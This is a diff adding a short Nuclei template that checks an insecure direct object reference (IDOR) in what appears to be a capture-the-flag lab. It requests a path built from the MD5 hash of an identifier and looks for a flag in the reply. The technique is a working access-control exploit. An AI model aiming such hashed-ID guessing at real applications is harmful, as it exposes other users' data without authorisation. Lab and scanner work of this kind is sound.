@@ -1,0 +1,25 @@
+id: idor
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct idor page
+
+http:
+
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+
+    - |
+      GET /corridor/cfcd208495d565ef66e7dff9f98764da HTTP/2
+      Host: {{Hostname}}
+      
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag{"
